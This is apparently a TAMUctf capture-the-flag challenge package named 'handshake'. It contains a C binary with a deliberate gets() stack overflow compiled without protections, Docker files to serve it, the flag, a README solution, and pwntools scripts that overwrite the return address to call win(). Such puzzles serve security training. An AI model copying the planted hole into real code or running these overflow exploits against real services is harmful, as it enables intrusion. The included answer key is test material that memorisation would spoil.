{
    "build.sh": "#!/bin/sh\ndocker build -t gcc:handshake -f Dockerfile.build .\ndocker run --user $(id -u):$(id -g) --rm -ti -v $(pwd):/opt/build gcc:handshake handshake.c -no-pie -fno-stack-protector -m32 -o handshake",
    "challenge.py": "from hacksport.operations import execute\nfrom hacksport.problem import Challenge, File\n\n\nclass Problem(Challenge):\n    def setup(self):\n        self.files = []\n\n    def generate_flag(self, random):\n        return r\"gigem{r37urn_c0n7r0l1337}\"\n",
    "Dockerfile": "FROM debian:bullseye-slim as build\n\nRUN apt-get update -y\nRUN apt-get install build-essential gcc-multilib  -y\nADD handshake.c /tmp/handshake.c\nRUN cd /tmp/; gcc handshake.c -no-pie -fno-stack-protector -m32 -o handshake\n\nFROM debian\n\nRUN dpkg --add-architecture i386\nRUN apt-get update -y\nRUN apt-get install socat libc6-i686 -y\n\nCOPY --from=build /tmp/handshake /pwn/handshake\nCOPY flag.txt /pwn/flag.txt\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE 4212\n\nENTRYPOINT [\"sh\", \"-c\", \"exec socat TCP-LISTEN:4212,reuseaddr,fork EXEC:/pwn/handshake,stderr\"]\n",
    "Dockerfile.build": "FROM debian:bullseye-slim as build\n\nRUN apt-get update -y\nRUN apt-get install build-essential gcc-multilib  -y\nADD handshake.c /opt/build/handshake.c\nWORKDIR /opt/build\n\nENTRYPOINT [\"gcc\"]",
    "flag.txt": "gigem{r37urn_c0n7r0l1337}",
    "handshake.c": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\nvoid win() {\n\tFILE* flag = fopen(\"flag.txt\", \"r\");\n\tchar buf[64];\n\tif(flag == NULL) {\n\t\tstrcpy(buf,\"Flag file is missing, run that exploit again on the server!\");\n\t} else {\n\t\tfgets(buf, 64, flag);\n\t}\n\tprintf(\"Correct! %s\\n\", buf);\n\tfflush(0);\n}\n\nvoid lose() {\n\tprintf(\"That isn't correct!  You aren't supposed to be here. \\n\");\n}\n\nvoid vuln() {\n\tprintf(\"Whats the secret handshake? \");\n\tfflush(0);\n\tchar buf[32];\n\tgets(buf);\n\tprintf(\"\\n\");\n}\n\nvoid main() {\n\tvuln();\n\tlose();\n}",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := \nCONTAINER := handshake\n\nall: handshake\n\nclean: .PHONY\n\trm -f handshake\n\ncalculator: handshake.c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile\n\tdocker build -t $(CONTAINER) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(CONTAINER) -p 6319:6319 calculator\n\nextract: docker\n\t$(eval id := $(shell docker create $(CONTAINER)))\n\tdocker cp $(id):/pwn/handshake - | tar xv handshake\n\tdocker rm -v $(id)\n\n.PHONY:\n",
    "problem.json": "{\n  \"name\": \"Handshake\",\n  \"category\": \"Pwn\",\n  \"description\": \"Attack this binary and get the flag!\\n<a href='http://tamuctf.com/static-files/handshake'>handshake</a>\\n<code>openssl s_client -connect tamuctf.com:443 -servername handshake -quiet</code>\",\n  \"score\" : 150,\n  \"hints\": [\"\"],\n  \"walkthrough\": \"N/A\",\n  \"author\": \"Teddy Heinen\",\n  \"organization\": \"TAMUctf\",\n  \"event\": \"TAMUctf\"\n}\n\n",
    "README.md": "# handshake\n\n## Description\n\nAttack this binary and get the flag!\n\n## Solution\n\nAll we need to do is invoke \"win\", which we'll do using the all-too-simple `vuln` function and getting a [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming).\n\nGhidra tells us that the position of the buffer is -0x2c, so we use that for our length calculation. Then struct.pack up\na return address for win.\n\nSolution script is provided in solution.py.\n",
    "solution.py": "from pwn import *\nimport struct\n\ncontext.terminal = ['tilix', '-e']\n\n#c = process('./handshake')\n#c = gdb.debug('./handshake')\nc = remote('localhost', 4444)\n\nc.sendline(b'a'*0x2c + struct.pack(\"<L\", 0x080491c2))\nprint(c.recvall())\n",
    "solver.py": "from pwn import *\nimport re\n\nelf = ELF(\"./handshake\")\n\n# p = process(\"./handshake\")\np = remote('localhost', 4212)\np.sendline(cyclic(44) + p32(elf.symbols['win']))\n\nprint(re.search(\"gigem{.*}\", p.recvall().decode()).group(0))",
    "category": "pwn"
}